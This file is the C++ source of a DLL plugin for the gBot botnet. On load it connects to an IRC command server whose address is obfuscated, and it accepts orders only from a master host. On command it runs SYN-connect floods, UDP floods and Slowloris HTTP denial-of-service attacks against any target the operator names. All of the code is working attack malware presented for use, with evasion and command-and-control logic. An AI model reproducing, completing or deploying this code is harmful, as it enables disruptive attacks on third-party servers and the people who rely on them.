/*
	gBot DDoS Plugin
	by: jam3s/fubar;
*/

#include "StdAfx.h"

// IRC Configuration
char szMasterHost[] = "gfhjkmxtu";
char szCmdPrefix[] = ".";
char szChanPass[] = "gBot";
char szServPass[] = "gBot";

_SERVERS sServer[] =
{
	{"ïäöñíàæ²´¯åøïåïò¯èïçî", 6667, "¢ÅÅîÒ"},
	{NULL, 0, NULL}
};
int confPos = 0;
BOOL silent = FALSE;

// DDoS Stuff
#define UDP_SOCKETS 160
#define SUPERSYN_SOCKETS 160
BOOL packetstop = TRUE;
sFlood sDDoS;
// - SlowLoris Below
char szDefaultUserAgent[] = "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; Windows NT 5.0)";
HANDLE hHTTPThreads[15];
HANDLE hMngrThreads[15];
HANDLE hSlowlorisThread;
char cMethod[8];
char cHost[256];
int  iMinutes;
int  iTimes;
int  lCurrent = 0;

// Plugin Stuff
HANDLE hMutex;
HANDLE hPlugin;
HANDLE hThread_IRC;
HANDLE hThread_DDoS;

/* Plugin Code */
BOOL APIENTRY DllMain(HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		hPlugin = hModule;
		hThread_IRC = CreateThread(NULL, NULL, Thread_IRC, NULL, NULL, 0);
		break;
	}
    return TRUE;
}

void DbugMsg(char* s, ...)
{
	char t[1024];
	char msg[1024];
	va_list va;
	
	va_start(va, s);
	vsprintf(t, s, va);
	sprintf(msg, __FUNCTION__" : %s", t);
	OutputDebugString(msg);
}

BOOL Verify_gBot()
{
	HANDLE hFile;
	
	hFile = CreateFile(sexor(GBOTPIPE, KEY), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);         
	if(hFile == INVALID_HANDLE_VALUE)																	 
	{
		return FALSE;
	}
	CloseHandle(hFile);
	return TRUE;
}

char *sexor(char *string, char *decode_key)
{
	unsigned int	i, j;
	char *orig = (char *)malloc(strlen(string)+1);
	
	memset(orig, 0, sizeof(orig));
	sprintf(orig, string);
	
	for ( i = 0; i < strlen( orig ); i++ ) {
		for ( j = 0; j < strlen( decode_key ); j++ )
			orig[ i ] ^= decode_key[ j ];
		
		orig[ i ] =~ orig[ i ];
		
	}
	return orig;	
}

void Unload()
{
	ReleaseMutex(hMutex);
	TerminateThread(hThread_DDoS, 0);
	TerminateThread(hSlowlorisThread, 0);
	for (int x = 0; x < 15; x++) {
		TerminateThread(hMngrThreads[x], 0);
		TerminateThread(hHTTPThreads[x], 0);
	}
	FreeLibraryAndExitThread((HINSTANCE)hPlugin, 0);
}

/* Other Code */
char **Explode(char *StrIn,const char *Delimiter) // Thanks Krippler
{
	int   iSize = 10;
	char *StrIn2;
	char *strInBuf;
	char **strOutBuf = (char **)malloc(sizeof(char *) * (iSize + 1));
	int   c = 0;
	
	StrIn2 = StrIn;
	strInBuf = strtok(StrIn2, Delimiter);
	
	while(strInBuf != 0)
	{
		if(c == iSize)
		{
			iSize += 10;
			strOutBuf = (char **)realloc(strOutBuf, sizeof(char *) * (iSize + 1));
		}
		strOutBuf[c] = strInBuf;
		strInBuf = strtok(0, Delimiter);
		++c;
	}
	
	strOutBuf[c] = 0;
	return strOutBuf;
}

/* IRC Code */
char *Generate_NICK()
{
	char szNick[MAX_PATH];
	DWORD dwRand;

	srand(GetTickCount());
	dwRand = rand() % 100000 + 1000;
	sprintf(szNick, "gDDoS[%d]", dwRand);
	return strtok(szNick, "//");
}

char *IRC_Login()
{
	char szData[512];
	char szNick[MAX_PATH];

	strcpy(szNick, Generate_NICK());
#ifdef _DEBUGLITE
	DbugMsg("Using NICK %s", szNick);
#endif
	DbugMsg("xWin32");

	sprintf(szData, "PASS %s\r\nNICK %s\r\nUSER %s d d %s\r\n", szServPass, szNick, szNick);
	return strtok(szData, "//");
}

int IRC_Parse(SOCKET sock, char *szData)
{
	char **szLines;
	long ret = 1;

	if (sock <= 0) { return -1; };
	
	szLines = Explode(szData, "\r\n");

	for (int x = 0; szLines[x] != NULL; x++)
	{
		ret = IRC_ParseLines(sock, szLines[x]);
		if (ret <= 0) {
			break;
		}
	}

	return ret;
}

int IRC_ParseLines(SOCKET sock, char *szLine)
{
	char **szWords;
	char **Commands =  { 0 };
	char szBuffer[1024] = { 0 };
	long ret = 1;
	int x = 0;
	int i = 0;
	int c = 0;

	if (sock <= 0) { return -1; };
	
#ifdef _DEBUGLITE
	DbugMsg("Parsing: %s", szLine);
#endif

	if ((strstr(szLine, "422")) || (strstr(szLine, "MOTD"))) { 
		sprintf(szBuffer, "JOIN %s %s\r\n", sexor(sServer[confPos].szChannel, KEY), szChanPass);
#ifdef _DEBUGLITE
		DbugMsg("Sent: JOIN %s", sexor(sServer[confPos].szChannel, KEY));
#endif
		ret = send(sock, szBuffer, strlen(szBuffer), 0);
		return ret;
	}

	szWords = Explode(szLine, " ");
	
	// PING PONG
	if (!strcmp(szWords[0], "PING")) {
		// PING
		sprintf(szBuffer, "PONG %s\r\n", szWords[1]);
		ret = send(sock, szBuffer, strlen(szBuffer), 0);
		return ret;
	} 
	if (szWords[1] == NULL) { return ret; };

	if (!strcmp(szWords[1], "433")) {
		// NICK is used!
		sprintf(szBuffer, "NICK %s\r\n", Generate_NICK());
		ret = send(sock, szBuffer, strlen(szBuffer), 0);
		return ret;
	}
	// Connected

	if ((!strcmp(szWords[1], "422")) || (!strcmp(szWords[1], "376")) || (!strcmp(szWords[1], "001"))) {
		sprintf(szBuffer, "JOIN %s\r\n", sexor(sServer[confPos].szChannel, KEY));
		ret = send(sock, szBuffer, strlen(szBuffer), 0);
		return ret;
	} 
	// PRIVMSG
	if (!strcmp(szWords[1], "PRIVMSG")) {
		// PRIVMSG
		int pos = strcspn(szWords[0], "@");
		for (i = 0; i <= pos; i++)
			szWords[0]++;

		szWords[3]++;

		if (strncmp(szWords[3], szCmdPrefix, strlen(szCmdPrefix))) // Command Prefix doesnt match!
			return 1;

		if (strcmp(szWords[0], szMasterHost))	// MasterHost doesnt match!
			return 1;

		for (i = 0; i < strlen(szCmdPrefix); i++)	// Remove Command Prefix
			szWords[3]++;

		for (i = 3; szWords[i] != NULL; i++)
			c++;
		
		Commands = (char **)realloc(Commands, sizeof(char *) * (c + 1));
	
		for (x = 3; szWords[x] != NULL; x++)
			Commands[x-3] = szWords[x];

		ret = IRC_ParseCommand(sock, szWords[2], Commands);
	}

	return ret;
}

int IRC_ParseCommand(SOCKET sock, char *from, char **szWords)
{
	long ret = 1;
	char szPath[MAX_PATH] = { 0 };

	if (sock <= 0) { return -1; };

#ifdef _DEBUGLITE
	DbugMsg("ParseCommand: %s From %s", szWords[0], from);
#endif

	if (!strcmp(szWords[0], "info")) {
		GetModuleFileName(NULL, szPath, sizeof(szPath));
		ret = IRC_PrivMsg(sock, from, "Loaded In: %s", szPath);
	} else if (!strcmp(szWords[0], "unload")) {
		ret = IRC_PrivMsg(sock, from, "Unloading...");
		return -2;
	} else if (!strcmp(szWords[0], "silent")) {
		if (!strcmp(szWords[1], "on")) {
			silent = TRUE;
		} else {
			silent = FALSE;
		}
	} else if (!strcmp(szWords[0], "ssyn")) {
		if (strlen(szWords[1]) < 7) { IRC_PrivMsg(sock, from, "You must specify an ip/host"); return 1; };
		if (!atoi(szWords[2])) { IRC_PrivMsg(sock, from, "You must specify an port"); return 1; };
		if (!atoi(szWords[3])) { IRC_PrivMsg(sock, from, "You must specify an length in secs"); return 1; };
		ret = IRC_PrivMsg(sock, from, "Performing SuperSyn Flood on %s:%d for %d secs", szWords[1], atoi(szWords[2]), atoi(szWords[3]));
		strcpy(sDDoS.ip, szWords[1]);
		strcpy(sDDoS.port, szWords[2]);
		strcpy(sDDoS.length, szWords[3]);
		strcpy(sDDoS.from, from);
		sDDoS.Type = 1;
		sDDoS.sock = sock;
		hThread_DDoS = CreateThread(NULL, NULL, Thread_DDoS, (LPVOID)&sDDoS, NULL, 0);
	} else if (!strcmp(szWords[0], "udp")) {
		if (strlen(szWords[1]) < 7) { IRC_PrivMsg(sock, from, "You must specify an ip/host"); return 1; };
		if (!atoi(szWords[2])) { IRC_PrivMsg(sock, from, "You must specify an port"); return 1; };
		if (!atoi(szWords[3])) { IRC_PrivMsg(sock, from, "You must specify an length in secs"); return 1; };
		ret = IRC_PrivMsg(sock, from, "Performing UDP Flood on %s:%d for %d secs", szWords[1], atoi(szWords[2]), atoi(szWords[3]));
		strcpy(sDDoS.ip, szWords[1]);
		strcpy(sDDoS.port, szWords[2]);
		strcpy(sDDoS.length, szWords[3]);
		strcpy(sDDoS.from, from);
		sDDoS.Type = 2;
		sDDoS.sock = sock;
		hThread_DDoS = CreateThread(NULL, NULL, Thread_DDoS, (LPVOID)&sDDoS, NULL, 0);
	} else if (!strcmp(szWords[0], "slow")) {
		if (strlen(szWords[1]) < 3) { IRC_PrivMsg(sock, from, "You must specify a flood type (GET/POST/RANDOM)"); return 1; };
		if ((szWords[2] == NULL) || (strlen(szWords[2]) < 7)) { IRC_PrivMsg(sock, from, "You must specify a domain/dns (www.hackforums.net)"); return 1; };
		if (!atoi(szWords[3])) { IRC_PrivMsg(sock, from, "You must specify the length of for each thread (best 3 mins)"); return 1; };
		if (!atoi(szWords[4])) { IRC_PrivMsg(sock, from, "You must specify how many times to perform the flood (0 = INFINITE)"); return 1; };
		strcpy(sDDoS.slowtype, szWords[1]);
		strcpy(sDDoS.ip, szWords[2]);
		strcpy(sDDoS.from, from);
		sDDoS.mins = atoi(szWords[3]);
		sDDoS.times = atoi(szWords[4]) * 15;
		sDDoS.sock = sock;
		sDDoS.Type = 3;
		lCurrent = 0;
		packetstop = FALSE;
		hThread_DDoS = CreateThread(NULL, NULL, Thread_DDoS, (LPVOID)&sDDoS, NULL, 0);
	} else if (!strcmp(szWords[0], "stop")) {
		packetstop = TRUE;
	}

	return ret;
}

int IRC_PrivMsg(SOCKET sock, char *To, char *szMessage, ...)
{
	long ret;
	char szBuffer[1024] = { 0 };
	char msg[1024] = { 0 };
	char t[1024] = { 0 };
	va_list va;
	
	if (sock <= 0) { return -1; };
	if (silent == TRUE) { return 1; };

	va_start(va, szMessage);
	vsprintf(t, szMessage, va);
	sprintf(szBuffer, "PRIVMSG %s :%s\r\n", To, t);
	ret = send(sock, szBuffer, strlen(szBuffer), 0);
	return ret;
}

DWORD WINAPI Thread_IRC(LPVOID lpParam)
{
	WSAData wsaData;
	SOCKET sock;
	SOCKADDR_IN sAddrIn;
	unsigned int uiResolve;
	struct hostent *hHostent;
	char szBuffer[1024];
	long ret = 0;

	if (!sServer[confPos].lPort) {
		Sleep(5000);
		Unload();
	}
	Sleep(5000);

	// Check if already loaded

#ifdef _WITHMUTEX
	hMutex = CreateMutex(NULL, TRUE, "gBotDDoSS");
	if(GetLastError() == ERROR_ALREADY_EXISTS) 
	{
		Unload();
		return TRUE;
	}
#endif

	// Check if its build for correct user
	if (!Verify_gBot()) {
		// Plugin is not authenticated for this copy of gbot
		Unload();
	}

begin:
	if (!sServer[confPos].lPort) { confPos = 0; };
	// Start Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		Unload();
		return 0;
	}

	// Check Host Exists
	if (!sServer[confPos].lPort) {
		Sleep(5000);
		Unload();
	}

	// Create Socket
	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
		WSACleanup();
		Unload();
	}

	// Resolve Host
	uiResolve = inet_addr(sexor(sServer[confPos].szDNS, KEY));
	if (uiResolve == INADDR_NONE)
	{
		// Not an IP lets resolve Hostname..
		hHostent = gethostbyname(sexor(sServer[confPos].szDNS, KEY));
		if (hHostent == 0) { 
			closesocket(sock);
			WSACleanup();
			confPos++;
			goto begin;
		} else {
			uiResolve = *(u_int *)(hHostent->h_addr);
		}
	}
	ZeroMemory(&sAddrIn, sizeof(sAddrIn));
	sAddrIn.sin_family = AF_INET;
	sAddrIn.sin_port = htons((static_cast<unsigned short>(sServer[confPos].lPort)));
	sAddrIn.sin_addr.s_addr = uiResolve;

	// Connect
	if(connect(sock, (SOCKADDR *)&sAddrIn, sizeof(sAddrIn)) == SOCKET_ERROR) { 
#ifdef _DEBUGLITE
		DbugMsg("Error Connecting To %s", sexor(sServer[confPos].szDNS, KEY));
#endif
		closesocket(sock);
		WSACleanup();
		confPos++;
		goto begin;
	}
#ifdef _DEBUGLITE
	DbugMsg("Connected To %s", sexor(sServer[confPos].szDNS, KEY));
#endif

	// Send Initial Packet
	sprintf(szBuffer, IRC_Login());
	send(sock, szBuffer, strlen(szBuffer), 0);
#ifdef _DEBUGLITE
	DbugMsg("Sent Join Packet");
#endif

	// Parse Recv Data
	while (1)
	{
		Sleep(200);
		memset(szBuffer, 0, sizeof(szBuffer));
		ret = recv(sock, szBuffer, sizeof(szBuffer), 0);
		if (ret <= 0)
		{
			closesocket(sock);
			WSACleanup();
			confPos++;
			goto begin;
			break;
		}
		ret = IRC_Parse(sock, szBuffer);
		if (ret <=0)
		{
			switch (ret)
			{
			case -1:
				// Disconnected
#ifdef _DEBUGLITE
				DbugMsg("Disconnected Prematurely From %s", sexor(sServer[confPos].szDNS, KEY));
#endif
				Sleep(30000);
				closesocket(sock);
				WSACleanup();
				goto begin;
			case -2:
				// Unload
				closesocket(sock);
				WSACleanup();
				goto end;
			}
		}
	}

end:
	Unload();
	return 1;
}

/* DDoS Code */

DWORD WINAPI Thread_DDoS(LPVOID lpParam)
{
	pFlood pDDoS = (pFlood)lpParam;

	packetstop = FALSE;

	if (pDDoS->Type == 1) {
#ifdef _DEBUGLITE
		DbugMsg("SSYN on %s:%s for %s seconds", pDDoS->ip, pDDoS->port, pDDoS->length);
#endif
		ssyn(pDDoS->ip, pDDoS->port, pDDoS->length);
		IRC_PrivMsg(pDDoS->sock, pDDoS->from, "Finished SuperSyn Flood On %s", pDDoS->ip);
	} else if (pDDoS->Type == 2) {
#ifdef _DEBUGLITE
		DbugMsg("UDP on %s:%s for %s secondsd", pDDoS->ip, pDDoS->port, pDDoS->length);
#endif
		udpflood(pDDoS->ip, pDDoS->port, pDDoS->length);
		IRC_PrivMsg(pDDoS->sock, pDDoS->from, "Finished UDP Flood On %s", pDDoS->ip);
	} else if (pDDoS->Type == 3) {
#ifdef _DEBUGLITE
		DbugMsg("Starting Slowloris type %s on %s for %d mins %d times", pDDoS->slowtype, pDDoS->ip, pDDoS->mins, pDDoS->times);
#endif
		if (strcmp(pDDoS->slowtype, "RANDOM")) {
			strcpy(cMethod, "RANDOM");
		} else if (strcmp(pDDoS->slowtype, "POST")) {
			strcpy(cMethod, "POST");
		} else if (strcmp(pDDoS->slowtype, "GET")) {
			strcpy(cMethod, "GET");
		} else {
			// No Match lets use default
			strcpy(cMethod, "RANDOM");
		}
		strcpy(cHost, pDDoS->ip);
		iMinutes = pDDoS->mins;
		iTimes = pDDoS->times;

		IRC_PrivMsg(pDDoS->sock, pDDoS->from, "Slowloris type %s on %s for %d mins %d times", pDDoS->slowtype, pDDoS->ip, pDDoS->mins, (pDDoS->times / 15));
		hSlowlorisThread = CreateThread(NULL, NULL, Slowloris_Thread, NULL, 0, 0);
		WaitForSingleObject(hSlowlorisThread, INFINITE);
		IRC_PrivMsg(pDDoS->sock, pDDoS->from, "Finished SlowLoris Flood on %s", pDDoS->ip);

	}

#ifdef _DEBUGLITE
	DbugMsg("Finished DDoS");
#endif

	packetstop = TRUE;

	return 1;
}

void ssyn(char *target, char *port, char *length)
{
    SUPERSYN ssyn;
	int     c;
	int     len = atoi(length);
	
	WSADATA  data;
	unsigned int resv_host;
	SOCKET   sock[SUPERSYN_SOCKETS];
    DWORD    mode = 1;
    struct   sockaddr_in saddr;

    if(WSAStartup(2, &data)!=0)
    {
#ifdef _DEBUGLITE
		DbugMsg("Error starting ssyn winsock");
#endif
	    return;
    }
    
    resv_host = Resolve(target);
    unsigned short p = (unsigned short)atoi(port);
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(p);
	saddr.sin_addr.s_addr = resv_host;
	
	ssyn.current = GetTickCount();
    ssyn.start = GetTickCount();
    
    while((ssyn.current - ssyn.start <= 1000 * len) && packetstop == FALSE) 
	{
		for (c = 0; c < SUPERSYN_SOCKETS; c++)
		{
			sock[c] = socket(AF_INET, SOCK_STREAM, 0);
			if (sock[c] == INVALID_SOCKET)
				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		
		for (c = 0; c < SUPERSYN_SOCKETS; c++)
		{
			connect(sock[c], (struct sockaddr*)&saddr, sizeof(saddr));
		}
		
		Sleep(100);
		
		for (c = 0; c < SUPERSYN_SOCKETS; c++)
			closesocket(sock[c]);
			
		ssyn.current = GetTickCount();
	}
	
};

void udpflood(char *ip, char *port, char *length)
{
    UDPFLOOD udp;
    int i, c;
    char buff[6500];
    
    WSADATA  data;
    unsigned int resv_host;
    SOCKET   sock[UDP_SOCKETS];
    DWORD    mode = 1;
    struct   sockaddr_in saddr;

    if(WSAStartup(2,&data)!=0)
    {
	    return;
    }

    resv_host = Resolve(ip);
    unsigned short p = (unsigned short)atoi(port);
    saddr.sin_family = AF_INET;
    saddr.sin_port = htons(p);
    saddr.sin_addr.s_addr = resv_host;
    
    for (i = 0; i < 6500; i++)
		buff[i] = (char)(rand() % 255);
		
    int len = atoi(length);
    udp.current = GetTickCount();
    udp.start = GetTickCount();
    
    while((udp.current - udp.start <= 1000 * len) && packetstop == FALSE) 
    {
        for (c = 0; c < UDP_SOCKETS; c++)
		{
			sock[c] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
   			if (sock[c] == INVALID_SOCKET)
      				continue;
			ioctlsocket(sock[c],FIONBIO,&mode);
		}
		
		for (c = 0; c < UDP_SOCKETS; c++)
		{
            sendto(sock[c], buff, sizeof(buff), 0, (sockaddr *)&saddr, sizeof(saddr));
        }
        
        Sleep(100);
        
        for (c = 0; c < UDP_SOCKETS; c++)
			closesocket(sock[c]);
			
	    udp.current = GetTickCount();
    }  
}

unsigned int Resolve(char *host)
{
	struct hostent		*hp;
	unsigned int		resv;
	
	resv = inet_addr( host );
	if ( resv == INADDR_NONE ) {
		hp = gethostbyname( host );
		if (hp == 0) {
			resv = 0;
		} else  {
			resv = *( u_int * )( hp->h_addr );
		}
	}
	return resv;
}

// - SlowLoris
int RealRand(int Max)
{
	int x = 0;
	
	srand(GetTickCount());
	x = rand() % 75 + 1;
	Sleep(x);
	x = rand() % Max + 1;
	
	return x;
}

char *Generate_Header(char *szMethod, char *szHost)
{
	char * cTmp = (char *)malloc(512);
	char * cUserAgent = (char *)malloc(512);
	DWORD dwRand;
	DWORD dwRandMethod;
	DWORD dwRandUserAgent;
	
	srand(GetTickCount());
	dwRand = rand() % 99999 + 1;
	Sleep(50);
	
	ObtainUserAgentString(0, cUserAgent, &dwRandUserAgent);
	if (dwRandUserAgent < 7)
	{
		dwRandUserAgent = RealRand(60);
		sprintf(cUserAgent, szDefaultUserAgent);
	}
	
	if (strstr(szMethod, "RANDOM"))
	{
		// Random GET/POST
		
		dwRandMethod = RealRand(2);
		if (dwRandMethod == 1) 
		{
			// GET
			sprintf(cTmp, "GET ");
		} else {
			sprintf(cTmp, "POST ");
		}
		sprintf(cTmp, "%s/ ?%d HTTP/1.1\r\n"
			"Host: %s\r\n"
			"User-Agent: %s\r\n"
			"Keep-Alive: 300\r\n"
			"Connection: keep-alive\r\n"
			"Content-Length: 42\r\n", cTmp, dwRand, szHost, cUserAgent);
		
	} else {
		sprintf(cTmp, "%s / ?%d HTTP/1.1\r\n"
			"Host: %s\r\n"
			"User-Agent: %s\r\n"
			"Keep-Alive: 300\r\n"
			"Connection: keep-alive\r\n"
			"Content-Length: 42\r\n", szMethod, dwRand, szHost, cUserAgent);
	}
	
	free(cUserAgent);
	return cTmp;
}

DWORD WINAPI PerformSlowloris_Thread(LPVOID lpParam)
{
	int lTimes = iTimes;
	int lThreadID = (LONG)lpParam;
	
	while (packetstop == FALSE)
	{
		Sleep(100);
#ifdef _DEBUGLITE
		DbugMsg("%d.Starting Slow", lThreadID);
#endif
		if (lCurrent > lTimes)
		{
			break;
		}
		
		hHTTPThreads[lThreadID] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HTTP_Thread, NULL, 0, 0);
		WaitForSingleObject(hHTTPThreads[lThreadID], INFINITE);
		lCurrent++;
#ifdef _DEBUGLITE
		DbugMsg("%d.Finish HTTP");
#endif
		if (lTimes > 0)
		{
			// Its not INFINITE
			if (lCurrent >= lTimes)
			{
#ifdef _DEBUGLITE
				DbugMsg("[%d/%d] %d.Finished Slowloris", lCurrent, iTimes, lThreadID);
#endif
				ExitThread(0);
			}
		}
	}

#ifdef _DEBUGLITE
	DbugMsg("Stopped SlowLoris");
#endif
	return FALSE;
}

DWORD WINAPI Slowloris_Thread(LPVOID lpParam)
{
	long iCurrent = 0;
	int lTimes = iTimes;
	
	while (packetstop == FALSE)
	{
		Sleep(1000);
		for (int i = 0; i <= 14; i++)
		{
			hMngrThreads[i] = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)PerformSlowloris_Thread, (LPVOID)i, 0, 0);
			Sleep(10);
		}
		
		WaitForMultipleObjects(14, hMngrThreads, TRUE, INFINITE);
#ifdef _DEBUGLITE
		DbugMsg("Finished Slowloris MngrThreads");
#endif
		break;
	}
	
	return TRUE;
}
DWORD WINAPI HTTP_Thread(LPVOID lpParam)
{
	WSAData wsaData;
	SOCKET sckWeb;
	SOCKADDR_IN sAddrIn;
	unsigned int uiResolve;
	struct hostent	   *hHostent;

	long lMinutes = iMinutes;
	long lCurrent = 0;
	char * szTmp    = (char *)malloc(128);
	char * szMethod = (char *)malloc(128);
	char * szHost   = (char *)malloc(256);
	char * szHeader = (char *)malloc(512);
	
	// Grab Settings
	sprintf(szMethod, cMethod);
	sprintf(szHost, cHost);
	// Start Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
#ifdef _DEBUGLITE
		DbugMsg("Error starting winsock");
#endif
		// Lets terminate the Slowloris thread
		TerminateThread(hSlowlorisThread, 0);
		free(szTmp); free(szMethod); 
		free(szHost); free(szHeader);
		ExitThread(0);
	}
	// Generate Header
	szHeader = Generate_Header(szMethod, szHost);
	// Create socket
	if ((sckWeb = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) {
#ifdef _DEBUGLITE
		DbugMsg("Error creating http socket");
#endif
		// Lets terminate the Slowloris thread
		closesocket(sckWeb);
		free(szTmp); free(szMethod); 
		free(szHost); free(szHeader);
		ExitThread(0);
	}
	// Resolve host
	uiResolve = inet_addr(szHost);
	if (uiResolve == INADDR_NONE)
	{
		// Host is not an IP
		hHostent = gethostbyname(szHost);
		if (hHostent == 0) { 
#ifdef _DEBUGLITE
			DbugMsg("Error resolving host");
#endif
			// Lets terminate the Slowloris thread
			closesocket(sckWeb);
			TerminateThread(hSlowlorisThread, 0);
			free(szTmp); free(szMethod); 
			free(szHost); free(szHeader);
			ExitThread(0);
		} else {
			uiResolve = *(u_int *)(hHostent->h_addr);
		}
	}
	ZeroMemory(&sAddrIn, sizeof(sAddrIn));
	sAddrIn.sin_family = AF_INET;
	sAddrIn.sin_port = htons(80);
	sAddrIn.sin_addr.s_addr = uiResolve;
	// Connect to HTTP
	if(connect(sckWeb, (SOCKADDR *)&sAddrIn, sizeof(sAddrIn)) == SOCKET_ERROR) { 
#ifdef _DEBUGLITE
		DbugMsg("Error connecting to %s", szHost);
#endif
		// Lets terminate the Slowloris thread
//		TerminateThread(hSlowlorisThread, 0);
		closesocket(sckWeb);
		free(szTmp); free(szMethod); 
		free(szHost); free(szHeader);
		ExitThread(0);
	}
#ifdef _DEBUGLITE
	DbugMsg("Connected %s", szHost);
#endif
	// Send headers
	if((send(sckWeb, szHeader, strlen(szHeader), 0)) == 0) { 
#ifdef _DEBUGLITE
		DbugMsg("Error sending headers");
#endif
		ExitThread(0);
	}
#ifdef _DEBUGLITE
	DbugMsg("Sent headers");
#endif
	free(szHeader);
	// Enter loop to check/keep alive.
	while (1)
	{
		Sleep(2500); // Pause 2.5 Seconds
		
		sprintf(szTmp, "X-a: b\r\n");
		if (((lCurrent / 24) * 60 / 60) >= lMinutes)
		{
			// Finished 
			sprintf(szTmp, "Connection: Close\r\n\r\n");
			if ((send(sckWeb, szTmp, strlen(szTmp), 0)) > 0) {
#ifdef _DEBUGLITE
				DbugMsg("Gracefully closed http connection");
#endif
			} else {
#ifdef _DEBUGLITE
				DbugMsg("Couldn't gracefully close http connection");
#endif
			}
			break;
		} else {
			// Not finished
			if ((send(sckWeb, szTmp, strlen(szTmp), 0)) > 0) {
				// Sent keep-alive
				lCurrent++;
				//DbugMsg("%d:Kept alive - %d mins", lCurrent, ((lCurrent / 24) * 60 / 60));
			} else {
				// socket is closed
#ifdef _DEBUGLITE
				DbugMsg("Remote server terminated socket unexpectedly (MaxKeepAlive?)");
#endif
 				closesocket(sckWeb);
 				free(szTmp); free(szMethod); 
 				free(szHost); 
				ExitThread(0);
			}
		}
	}
	closesocket(sckWeb);
	free(szTmp); free(szMethod); 
	free(szHost); 
	ExitThread(0);
	return FALSE;
}
